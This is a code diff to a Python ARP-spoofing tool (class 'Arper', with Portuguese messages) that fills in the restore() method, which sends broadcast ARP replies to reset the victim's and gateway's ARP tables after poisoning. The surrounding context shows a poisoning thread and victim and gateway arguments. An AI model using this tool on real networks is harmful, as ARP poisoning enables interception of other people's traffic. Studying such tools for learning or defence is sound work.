@@ -87,10 +87,25 @@ class Arper:
         self.restore()
         self.poison_thread.terminate()
         print('Concluído')
-        
+
 
     def restore(self):
-        pass
+        print('Restaurando tabelas ARP...')
+        send(ARP(
+            op=2,
+            psrc=self.gateway,
+            hwsrc=self.gateway_mac,
+            pdst=self.victim,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5)
+        send(ARP(
+            op=2,
+            psrc=self.victim,
+            hwsrc=self.victim_mac,
+            pdst=self.gateway,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5)
+        
 
 if __name__ == '__main__':
     (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
